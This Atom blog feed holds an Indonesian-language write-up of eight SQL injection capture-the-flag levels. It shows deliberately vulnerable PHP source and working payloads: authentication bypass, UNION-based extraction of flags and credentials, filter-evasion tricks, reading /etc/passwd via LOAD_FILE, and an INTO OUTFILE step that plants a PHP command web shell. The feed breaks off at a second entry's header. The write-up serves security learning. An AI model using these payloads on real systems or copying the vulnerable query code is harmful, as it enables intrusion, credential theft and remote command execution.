<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">



<title type="text">@abdilahrf</title>
<generator uri="https://github.com/mojombo/jekyll">Jekyll</generator>
<link rel="self" type="application/atom+xml" href="http://localhost:4000/feed.xml" />
<link rel="alternate" type="text/html" href="http://localhost:4000/" />
<updated>2017-06-02T13:13:18+07:00</updated>
<id>http://localhost:4000/</id>
<author>
  <name>Abdillah Muhamad</name>
  <uri>http://localhost:4000/</uri>
  <email>hasny1337@gmail.com</email>
</author>


<entry>
  <title type="html"><![CDATA[Writeup SQLInjection Challenges]]></title>
  <link rel="alternate" type="text/html" href="http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall"/>
  <id>http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall</id>
  <published>2017-03-20T00:00:00+07:00</published>
  <updated>2017-03-20T00:00:00-00:00</updated>
  
  <author>
    <name>Abdillah Muhamad</name>
    <uri>http://localhost:4000</uri>
    <email>hasny1337@gmail.com</email>
  </author>
  
  
  <category scheme="http://localhost:4000/tags/#sqlinjection" term="sqlinjection" />
  
  
  <content type="html">
  
    &lt;h3 id=&quot;sql-injection-challenges-writeup&quot;&gt;SQL Injection Challenges Writeup&lt;/h3&gt;

&lt;p&gt;Kita dapet soal ada 8 soal SQL injection yang cara untuk solvenya beragam, beberapa dari soal ngak bisa di selesain menggunakan automated tools seperti “SQLmap”,”Havij” atau kawan-kawannya di sini juga ada beberapa logic bypass yang perlu kita cari sendiri.&lt;/p&gt;

&lt;h3 id=&quot;level-1&quot;&gt;Level 1&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;My friend created a website where we can store secrets… Unfortunately, we can only see our own. Help me find all of my friend’s secrets.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Diberikan soal dan disertakan source code nya berikut :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php 

if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}

require(&quot;conf/level1.conf.php&quot;); 
error_reporting(0);

session_start();
if (isset($_POST['secret'])) { 
    $query = $conn-&amp;gt;prepare(&quot;INSERT INTO secrets(session_id, secret) VALUES (?, ?)&quot;);
    session_regenerate_id();
    $current_session_id = session_id();
    //die($current_session_id);
    $query-&amp;gt;bind_param('ss', $current_session_id, $_POST['secret']);
    $query-&amp;gt;execute() or die($conn-&amp;gt;error);
}

if (isset($_POST['session_id'])) { 
    $query = &quot;SELECT * FROM secrets WHERE session_id = '&quot; . $_POST['session_id'] . &quot;'&quot;;
    $result = $conn-&amp;gt;query($query);
} else {
    $query = &quot;SELECT * FROM secrets WHERE session_id = '&quot; . session_id() . &quot;'&quot;;
    $result = $conn-&amp;gt;query($query);
} 

?&amp;gt;

&amp;lt;!DOCTYPE HTML&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
        &amp;lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;div id=&quot;custom-bootstrap-menu&quot; class=&quot;navbar navbar-default &quot; role=&quot;navigation&quot;&amp;gt;
            &amp;lt;div class=&quot;container-fluid&quot;&amp;gt;
            &amp;lt;div class=&quot;navbar-header&quot;&amp;gt;&amp;lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&amp;gt;Secret Diary&amp;lt;/a&amp;gt;
                &amp;lt;button type=&quot;button&quot; class=&quot;navbar-toggle&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.navbar-menubuilder&quot;&amp;gt;&amp;lt;span class=&quot;sr-only&quot;&amp;gt;Toggle navigation&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;icon-bar&quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;icon-bar&quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;icon-bar&quot;&amp;gt;&amp;lt;/span&amp;gt;
                &amp;lt;/button&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;div class=&quot;collapse navbar-collapse navbar-menubuilder&quot;&amp;gt;
                &amp;lt;ul class=&quot;nav navbar-nav navbar-left&quot;&amp;gt;
                &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot;&amp;gt;Home&amp;lt;/a&amp;gt;
                &amp;lt;/li&amp;gt;
                &amp;lt;/ul&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
        &amp;lt;div class=&quot;container-fluid&quot;&amp;gt;
        &amp;lt;?php
        if (isset($_POST['secret'])) {
            echo '&amp;lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&amp;gt;Secret added successfully. You can view your secrets with the following session ID : '. session_id() .'&amp;lt;/div&amp;gt;';
        }
        ?&amp;gt;
        &amp;lt;div class=&quot;row&quot;&amp;gt;
            &amp;lt;div class=&quot;col-md-2&quot;&amp;gt;&amp;lt;/div&amp;gt;
            &amp;lt;div class=&quot;col-md-4&quot;&amp;gt;
                &amp;lt;form method=&quot;POST&quot; action=&quot;level1.php&quot;&amp;gt;
                    &amp;lt;div class=&quot;input-group&quot;&amp;gt;
                      &amp;lt;input type=&quot;text&quot; name=&quot;session_id&quot; class=&quot;form-control&quot; placeholder=&quot;Your session ID&quot; aria-describedby=&quot;basic-addon2&quot;&amp;gt;
                      &amp;lt;span class=&quot;input-group-btn&quot;&amp;gt;
                        &amp;lt;button class=&quot;btn btn-default&quot; type=&quot;submit&quot;&amp;gt;Get your secrets!&amp;lt;/button&amp;gt;
                     &amp;lt;/span&amp;gt;
                    &amp;lt;/div&amp;gt;
                &amp;lt;/form&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;div class=&quot;col-md-4&quot;&amp;gt;
                &amp;lt;form method=&quot;POST&quot; action=&quot;level1.php&quot;&amp;gt;

                    &amp;lt;div class=&quot;input-group&quot;&amp;gt;
                      &amp;lt;input type=&quot;text&quot; name=&quot;secret&quot; class=&quot;form-control&quot; placeholder=&quot;Your secret&quot; aria-describedby=&quot;basic-addon2&quot;&amp;gt;
                      &amp;lt;span class=&quot;input-group-btn&quot;&amp;gt;
                        &amp;lt;button class=&quot;btn btn-default&quot; type=&quot;submit&quot;&amp;gt;Add a new secret!&amp;lt;/button&amp;gt;
                     &amp;lt;/span&amp;gt;
                    &amp;lt;/div&amp;gt;
                &amp;lt;/form&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;div class=&quot;col-md-2&quot;&amp;gt;&amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;

    &amp;lt;br/&amp;gt;
    &amp;lt;br/&amp;gt;
    &amp;lt;br/&amp;gt;

        &amp;lt;div class=&quot;container-fluid&quot;&amp;gt;
        &amp;lt;div class=&quot;row&quot;&amp;gt;
            &amp;lt;div class=&quot;col-md-4&quot;&amp;gt;&amp;lt;/div&amp;gt;
            &amp;lt;div class=&quot;col-md-4&quot;&amp;gt;
                &amp;lt;div class=&quot;panel panel-default&quot;&amp;gt;
                  &amp;lt;div class=&quot;panel-heading&quot;&amp;gt;Your secrets&amp;lt;/div&amp;gt;

                  &amp;lt;!-- Table --&amp;gt;
                  &amp;lt;table class=&quot;table&quot;&amp;gt;
                    &amp;lt;?php
                    if (isset($result) &amp;amp;&amp;amp; $result-&amp;gt;num_rows &amp;gt; 0) {
                        // output data of each row
                        while($row = $result-&amp;gt;fetch_assoc()) {
                        echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot; . htmlspecialchars($row['secret']) . &quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;;    
                        }
                    } else {
                        echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;You don't have any secrets yet.&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;;
                    }
                    ?&amp;gt;
                  &amp;lt;/table&amp;gt;
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;div class=&quot;col-md-4&quot;&amp;gt;&amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;

        &amp;lt;/div&amp;gt;

    &amp;lt;script
              src=&quot;https://code.jquery.com/jquery-3.1.1.min.js&quot;
              integrity=&quot;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=&quot;
              crossorigin=&quot;anonymous&quot;&amp;gt;&amp;lt;/script&amp;gt;

        &amp;lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;


&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;cara untuk menjalankan query yang benar adalah menggunakan prepared statement seperti yang di gunakana pada&lt;code&gt;$query = $conn-&amp;gt;prepare(&quot;INSERT INTO secrets(session_id, secret) VALUES (?, ?)&quot;);&lt;/code&gt;namun masih ada kesalahan pada bagian &lt;code&gt;$query = &quot;SELECT * FROM secrets WHERE session_id = '&quot; . $_POST['session_id'] . &quot;'&quot;;&lt;/code&gt; di sini kesalahannya dia langsung memasukan input user ke dalam query tanpa menggunakan prepared statement jadi kita bisa injeksi sql di situ&lt;/p&gt;

&lt;p&gt;dengan simple &lt;code&gt;a' OR 1=1#&lt;/code&gt; kita bisa mendapatkan flagnya&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/flag-sqli-lv1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-2&quot;&gt;Level 2&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;I think an administrator blocked my account. Can you help me steal someone else’s account?&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: There are two flags in this challenge.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Diberikan soal yang meminta kita untuk melakukan login dan kita juga diberikan akses ke source code nya&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/sqli-lv2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php 
if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}
require(&quot;conf/level2.conf.php&quot;); 
error_reporting(0);

if (isset($_POST['username']) &amp;amp;&amp;amp; isset($_POST['password'])) {

    // $query = &quot;SELECT flag FROM my_secret_table&quot;; We leave commented code in production because we're cool.

    $query = &quot;SELECT username FROM users where username = '&quot; . $_POST['username'] . &quot;' and password = ?&quot;;

    // We use prepared statements, it must be secure.
    $query = $conn-&amp;gt;prepare($query); 

    // If query is invalid
    if ($query === false) {
        $error = true;
        $error_msg = &quot;&amp;lt;strong&amp;gt;Error!&amp;lt;/strong&amp;gt; Invalid SQL query&quot;;    
    } else {

    // Bind password param
    $query-&amp;gt;bind_param(&quot;s&quot;, $_POST['password']);
    $query-&amp;gt;execute();
    $query-&amp;gt;bind_result($user);
    $query-&amp;gt;fetch();

        // Check if a valid user has been found
        if ($user != NULL) {
            session_start();
            $_SESSION['is_logged_in'] = true;
            $_SESSION['username'] = $user;
        } else {
            $error = true;
            $error_msg = &quot;&amp;lt;strong&amp;gt;Wrong!&amp;lt;/strong&amp;gt; Username/Password is invalid.&quot;;
        }
    }

}
?&amp;gt;
&amp;lt;!DOCTYPE HTML&amp;gt;
&amp;lt;html&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&amp;gt;
    &amp;lt;style&amp;gt;
        .corb-body { background-color: #333;}

        .centered {
          position: fixed;
          top: 50%;
          left: 50%;
          /* bring your own prefixes */
          transform: translate(-50%, -50%);
        }

        .corb-login-length { width: 500px;}
        .corb-submit { position: relative; left: auto; right: -420px;}
        .corb-flag { color: #0F0; }
        .corb-alert { margin-top: 20px; }
    &amp;lt;/style&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body class=&quot;corb-body container-fluid&quot;&amp;gt;
        &amp;lt;?php if ($_SESSION['is_logged_in'] !== true) { ?&amp;gt;
            &amp;lt;?php if (isset($error) &amp;amp;&amp;amp; $error === true) { ?&amp;gt;
            &amp;lt;div class=&quot;container-fluid corb-alert&quot;&amp;gt;
                &amp;lt;div class=&quot;alert alert-danger&quot;&amp;gt;
                    &amp;lt;?php echo $error_msg; ?&amp;gt;
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;?php } ?&amp;gt;

        &amp;lt;div class=&quot;row&quot;&amp;gt;
            &amp;lt;div class=&quot;centered&quot;&amp;gt;
                &amp;lt;div class=&quot;well&quot;&amp;gt;
                    &amp;lt;h3 class=&quot;corb-login-length&quot;&amp;gt;Login If You Can&amp;lt;/h3&amp;gt;
                    &amp;lt;br/&amp;gt;
                    &amp;lt;form method=&quot;POST&quot;&amp;gt;
                    &amp;lt;input name=&quot;username&quot; class=&quot;form-control&quot; type=&quot;text&quot; placeholder=&quot;username&quot;&amp;gt;
                    &amp;lt;br/&amp;gt;
                    &amp;lt;input name=&quot;password&quot; class=&quot;form-control&quot; type=&quot;text&quot; placeholder=&quot;password&quot;&amp;gt;
                    &amp;lt;br/&amp;gt;
                    &amp;lt;input name=&quot;submit&quot; class=&quot;corb-submit btn btn-primary btn-lg&quot; type=&quot;submit&quot; value=&quot;Login&quot;&amp;gt;
                    &amp;lt;/form&amp;gt;
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
        &amp;lt;?php }else { ?&amp;gt;
            &amp;lt;div class=&quot;centered&quot;&amp;gt;
                &amp;lt;h1 class=&quot;corb-flag&quot;&amp;gt;Welcome &amp;lt;?php echo $_SESSION['username']; ?&amp;gt;! Here's some green text for you.&amp;lt;/h1&amp;gt;        
                &amp;lt;h1 class=&quot;corb-flag&quot;&amp;gt;&amp;lt;?php echo $flag; ?&amp;gt;&amp;lt;/h1&amp;gt;        
            &amp;lt;/div&amp;gt;
        &amp;lt;?php } ?&amp;gt;

        &amp;lt;script
              src=&quot;https://code.jquery.com/jquery-3.1.1.min.js&quot;
              integrity=&quot;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=&quot;
              crossorigin=&quot;anonymous&quot;&amp;gt;&amp;lt;/script&amp;gt;

        &amp;lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;


    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&amp;lt;?php
session_destroy();
?&amp;gt;
1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lagi-lagi di level2 ini mereka juga menggunakan prepared statement nya tidak secara keseluruhan, untuk kolom username dia langsung ambil dari user input dengan &lt;code&gt;$_POST&lt;/code&gt; tapi pada kolom password dia mengunakan prepared statement. kita bisa membuat query tersebut selalu mengembalikan true dengan &lt;code&gt;' OR 1=1#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/flag-sqli-lv2-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;pada soal ini diberitahu bahwa ada 2 flag, berarti kita harus coba dig more ke source code yang diberikan dan ada clue di komentar &lt;code&gt;// $query = &quot;SELECT flag FROM my_secret_table&quot;; We leave commented code in production because we're cool.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;dan karena username yang di select dari database di simpan kedalam session dan ditampilkan saat login maka kita bisa menggunakan union untuk mereplace username yang sebenarnya dengan hasil dari query yang kita mau dengan menggunakan union &lt;code&gt;' union select flag from my_secret_table #&lt;/code&gt; sebagai username dan di dapatkan flagnya&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/flag-sqli-lv2-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-3&quot;&gt;Level 3&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Time for bug bounties! This multinational technology company has been hacked so many times, we might be able find a new bug and make some money out of it…&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Diberikan soal seperti search engine &lt;code&gt;Google&lt;/code&gt; tapi ini namanya &lt;code&gt;Gogol&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/soal-sqli-lv3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php 
if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}

require(&quot;conf/level3.conf.php&quot;); 
error_reporting(0);


if (isset($_GET['q'])) {

    $filter = array('union', 'select');

    // Remove all banned characters
    foreach ($filter as $banned) {
        $_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
    } 
}


?&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
 &amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;Gogol Search&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://www.goglogo.com/include/goglogo.css&quot; type=&quot;text/css&quot; /&amp;gt;
  &amp;lt;/head&amp;gt;

 &amp;lt;body style=&quot;margin:0;padding:0;&quot;&amp;gt;
 &amp;lt;div id=&quot;overlay_bg&quot; style=&quot;display:none; background-color:#000000; position:fixed; z-index:1001&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
    &amp;lt;div class=&quot;content-area&quot;&amp;gt;
        &amp;lt;div class=&quot;logo&quot;&amp;gt;
    &amp;lt;img src=&quot;http://funnylogo.info/logo/Google/White/Gogol.aspx&quot;&amp;gt;
        &amp;lt;/div&amp;gt;
        &amp;lt;div class=&quot;searchBox&quot;&amp;gt;
            &amp;lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; border=&quot;0&quot;&amp;gt;
            &amp;lt;tr&amp;gt;
                &amp;lt;td&amp;gt;
                    &amp;lt;form name=&quot;frm&quot; id=&quot;frm&quot; method=&quot;GET&quot;&amp;gt;
                    &amp;lt;input type=&quot;text&quot; name=&quot;q&quot; size=&quot;40&quot; value=&quot;&quot;/&amp;gt;
                    &amp;lt;input type=&quot;submit&quot;/&amp;gt;
                    &amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;
                    &amp;lt;/form&amp;gt;
                &amp;lt;/td&amp;gt;
            &amp;lt;/tr&amp;gt;
            &amp;lt;/table&amp;gt;
            &amp;lt;br/&amp;gt;
        &amp;lt;/div&amp;gt;

    &amp;lt;?php
    if (isset($_GET['q'])) {

        $query = &quot;SELECT * FROM search_engine WHERE title LIKE '%&quot; . $_GET['q'].  &quot;%' OR description LIKE '%&quot; . $_GET['q'] .  &quot;%' OR link LIKE '%&quot; . $_GET['q'] . &quot;%';&quot;;
        $result = $conn-&amp;gt;query($query);

        echo  &quot;&amp;lt;h2&amp;gt;Number of results for '&quot;. htmlspecialchars($_GET['q']) . &quot;' : &quot; . $result-&amp;gt;num_rows . &quot;&amp;lt;/h2&amp;gt;&quot;;
    ?&amp;gt;
    &amp;lt;?php
        if (isset($result) &amp;amp;&amp;amp; $result-&amp;gt;num_rows &amp;gt; 0) {
            echo &quot;&amp;lt;hr/&amp;gt;&quot;;
            echo &quot;&amp;lt;br/&amp;gt;&quot;;

            // output data of each row
            while($row = $result-&amp;gt;fetch_assoc()) {
                echo &quot;&amp;lt;div&amp;gt;&quot;;
                echo &quot;&amp;lt;a href='&quot; . $row['link'] . &quot;'&amp;gt;&amp;lt;h2&amp;gt;&quot; . htmlspecialchars($row['title']) . &quot;&amp;lt;/h2&amp;gt;&amp;lt;/a&amp;gt;&quot;;
                echo &quot;&amp;lt;h3&amp;gt;&quot; . htmlspecialchars($row['link']) . &quot;&amp;lt;/h3&amp;gt;&quot;;
                echo &quot;&amp;lt;p&amp;gt;&quot; . htmlspecialchars($row['description']) . &quot;&amp;lt;/p&amp;gt;&quot;;
            }
        }
    ?&amp;gt;

    &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&amp;lt;?php } ?&amp;gt;
1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oke, kita coba analisa source code yang di dapatkan, disini input kita di treatment secara berbeda dengan level sebelumnya kali ini menggunakan parameter &lt;code&gt;$_GET&lt;/code&gt; kita bisa menggunakan &lt;code&gt;union&lt;/code&gt; lagi untuk me-replace hasil dari query dengan hasil query yang kita inginkan tapi permasalahannya union dan select ada di blacklist.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;$filter = array('union', 'select');

// Remove all banned characters
foreach ($filter as $banned) {
$_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;semua yang match dengan union atau select akan di replace menjadi empty string “” ini sebenernya bad practice karena kita bisa melakukan bypass dengan cara &lt;code&gt;uniunionon&lt;/code&gt; maka union yang di tengah akan di hapus menjadi empty string sehingga terbentuklah union yang tadinya di blacklist, kita sudah berhasil melakukan bypass terhadap filter yang ada.&lt;/p&gt;

&lt;p&gt;maka kita bisa menggunakan &lt;code&gt;' uniunionon selselectect concat(table_name),1,1 from information_schema.tables#&lt;/code&gt; untuk mendapatkan semua table yang ada dan kita menemukan table &lt;code&gt;secret&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/list-table-sqli-lv3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;kemudian &lt;code&gt;' uniunionon selselectect concat(column_name),1,1 from information_schema.columns where table_name='secret'#&lt;/code&gt; untuk mendapatkan kolom dari table secret&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/column-sqli-lv3.png&quot; alt=&quot;&quot; /&gt;ketika kita udah tau nama kolom nya dan tabelnya tinggal dimunculin aja tuh flag gan pake ini &lt;code&gt;' uniunionon selselectect flag,1,1 from secret#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/flag-sqli-lv3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-4&quot;&gt;Level 4&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Seems like our previous bug has been patched now… Let’s double check that they did their job properly.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Soal yang di berikan sama seperti soal di lvl 3 tapi sekarang blacklist nya diperbaharui&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;if (isset($_GET['q'])) {

    $filter = array('UNION', 'SELECT');

    // Remove all banned characters
    foreach ($filter as $banned) {
        if (strpos($_GET['q'], $banned) !== false) die(&quot;Hacker detected&quot;); 
        if (strpos($_GET['q'], strtolower($banned)) !== false) die(&quot;Hacker detected&quot;); 
    } 
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Singkat cerita jadi itu yang di blacklist adalah “UNION,union,SELECT,SELECT” sehingga kita bisa menggunakan “UNiON,SElECT” dengan cara yang sama dengan level3 kita bisa mendapatkan flagnya&lt;/p&gt;

&lt;p&gt;&lt;code&gt;3' UNiON SElECT concat(username,password),1,1 from users#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/lvl4-sqli-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-5&quot;&gt;Level 5&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;These developers are sloppy… They claim that their website is secure now (for the second time), I hope they are right this time…&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Di level5 kali ini di filter kita tidak boleh menggunakan space.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;if (isset($_GET['q'])) {
    // Ban space character
    if (strpos($_GET['q'], &quot; &quot;) !== false) die(&quot;Hacker detected&quot;); 
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ada beberapa trik yang bisa di gunakan untuk menggantikan space di SQL contohya &lt;code&gt;/**/&lt;/code&gt; kita mengunakan komentar untuk mengantikan spasi. dengan menggunakan cara yang sama dengan level sebelumnya kita bisa mendapatkan flagnya&lt;/p&gt;

&lt;p&gt;&lt;code&gt;'/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secret#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/sqli-lv5-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-6&quot;&gt;Level 6&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;I’m starting to believe that these developers are complete idiots. They just claimed that blacklisting single-quotes and double-quotes solve every SQL injection issue.&lt;/p&gt;

  &lt;p&gt;Let’s prove them wrong.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Kita diberikan soal yang sama lagi dengan level sebelumnya tapi kali ini single quote dan double quote di blacklist jadi kita harus melakukan SQLinjection tanpa single quote dan double quote.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;if (isset($_GET['q'])) {
    // Ban space character
    if (strpos($_GET['q'], &quot;'&quot;) !== false) die(&quot;Hacker detected&quot;); 
    if (strpos($_GET['q'], '&quot;') !== false) die(&quot;Hacker detected&quot;); 
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;level-7&quot;&gt;Level 7&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;My teacher has this weird website. I doubt there’s any useful information in the database. Maybe we can leak the /etc/passwd file instead?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Setelah di enumurasi ternyata beberapa keyword di blacklist, seperti : **Union,Select,Load_File,From. **Dan Spasi juga di blacklist ternyata ketika di coba kita bisa melakukan bypass pada keyword yang di filter dengan cara yang di level sebelumnya yaitu ketika match dengan suatu keyword dia akan mereplace dengan empty string maka kita bisa mengunakan payload &lt;code&gt;' UNIunionON SELselectECT concat(table_name) frfromom information_schema.tables#&lt;/code&gt; namun masih error ternyata karena kita masih mengunakan spasi modifikasi payload tanpa menggunakan spasi &lt;code&gt;level7.php?id=6565656/**/UNIunionON/**/SELselectECT/**/LOAD_load_fileFILE(%27/etc/passwd%27)#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/lvl8-sqli.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-8&quot;&gt;Level 8&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;I have no idea how I landed here, but this website is making me doubt everything I know.&lt;/p&gt;

  &lt;p&gt;Is global warming real???&lt;/p&gt;

  &lt;p&gt;Can Trump control the weather???&lt;/p&gt;

  &lt;p&gt;Is the Earth flat???&lt;/p&gt;

  &lt;p&gt;There’s only one way to find out : let’s pop a shell.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code&gt;4444+union+select+null,&quot;&amp;lt;?php%20system($_GET[\&quot;cmd\&quot;]);?&amp;gt;&quot;%20INTO%20OUTFILE%20&quot;/var/www/html/uploads/lala.php&quot;#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;disini kita bisa menggunakan into outfile untuk menulis file backdoor ke folder uploads&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/rce-sqli-lv8.png&quot; alt=&quot;&quot; /&gt;Dan kita menemukan secret folder &lt;strong&gt;secret_level8_folder_you_wont_be_able_to_guess_without_actually_getting_a_shell&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secret-folder-sqli-lv8.png&quot; alt=&quot;&quot; /&gt;kemudian kita mendapatkan flagnya&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/flag-sqli-lv8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;


  
  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall&quot;&gt;Writeup SQLInjection Challenges&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on March 20, 2017.&lt;/p&gt;</content>
</entry>



<entry>
  <title type="html"><![CDATA[Writeup FIT FUNFEST 2017 : EncryptedELF]]></title>
  <link rel="alternate" type="text/html" href="http://localhost:4000/crypto/writeup-fit-funfest-ctf.encryptedelf"/>
  <id>http://localhost:4000/crypto/writeup-fit-funfest-ctf.encryptedelf</id>
  <published>2017-03-16T00:00:00+07:00</published>
  <updated>2017-03-16T00:00:00-00:00</updated>
  
  <author>
    <name>Abdillah Muhamad</name>
    <uri>http://localhost:4000</uri>
    <email>hasny1337@gmail.com</email>
  </author>
  
  
  <category scheme="http://localhost:4000/tags/#FIT" term="FIT" />
  
  
